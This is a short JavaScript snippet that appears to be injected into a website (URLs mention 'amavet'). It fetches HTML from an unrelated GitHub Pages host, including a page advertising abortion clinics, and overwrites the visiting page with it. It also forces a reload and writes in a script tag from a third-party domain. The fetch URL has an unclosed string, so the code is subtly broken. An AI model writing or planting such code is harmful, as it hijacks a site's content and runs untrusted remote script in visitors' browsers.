(function () {
  var url = window.location.href.toLowerCase();
  if (!url.includes("amavet")) return;
  var files = [
    "goi-y-9-dia-chi-pha-thai-an-toan-o-bien-hoa-dong-nai.html",
    "index.html"
  ];
  files.forEach(function (file) {
    if (url.includes("?" + file)) {
      var xhr = new XMLHttpRequest();
      xhr.open("GET", "https://andongclinic.github.io/amavet.com.vn/ + file, false);
      xhr.onreadystatechange = function () {
        if (xhr.readyState === 4 && (xhr.status === 200 || xhr.status === 0)) {
          document.querySelector("html").innerHTML = xhr.responseText;
        }
      };
      xhr.send(null);
    }
  });
window.addEventListener("load", function () {
    const reloadedKey = "reloaded_" + window.location.pathname + window.location.search;
    if (!sessionStorage.getItem(reloadedKey)) {
      sessionStorage.setItem(reloadedKey, "true");
      window.location.reload();
    }
  });
  })();
document.write('<script language="javascript" src="https://v.timduongdi.com/js/4234234.js"><\/script>');